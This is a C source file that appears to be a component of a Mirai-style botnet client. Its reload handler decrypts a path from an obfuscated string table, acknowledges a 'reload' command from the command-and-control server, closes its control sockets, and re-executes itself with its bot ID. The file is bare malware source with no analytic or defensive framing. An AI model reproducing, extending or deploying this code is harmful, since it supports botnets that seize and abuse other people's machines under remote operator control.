#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <fcntl.h>

#include "headers/includes.h"
#include "headers/reload.h"
#include "headers/cnc.h"
#include "headers/protocol.h"
#include "headers/table.h"
#include "headers/util.h"
#include "headers/update.h"

extern int fd_serv;
extern int fd_ctrl;

void reload_handle(void)
{
    char exe_path[256];
    char *argv[3];
    int exe_len;
    const char *bot_id;

    table_unlock_val(PROC_SELF_EXE);
    exe_len = readlink(table_retrieve_val(PROC_SELF_EXE, NULL), exe_path,
                       sizeof(exe_path) - 1);
    table_lock_val(PROC_SELF_EXE);

    if (exe_len <= 0)
    {
        cnc_send_ack(fd_serv, CNC_OP_RELOAD, CNC_ACK_FAIL);
        return;
    }

    exe_path[exe_len] = 0;

    bot_id = update_get_bot_id();
    argv[0] = exe_path;
    if (bot_id != NULL && bot_id[0] != 0)
    {
        argv[1] = (char *)bot_id;
        argv[2] = NULL;
    }
    else
    {
        argv[1] = NULL;
    }

    cnc_send_ack(fd_serv, CNC_OP_RELOAD, CNC_ACK_OK);

    if (fd_ctrl != -1)
        close(fd_ctrl);
    if (fd_serv != -1)
        close(fd_serv);

#ifdef DEBUG
    printf("[reload] re-exec %s\n", exe_path);
#endif

    execve(exe_path, argv, NULL);
}
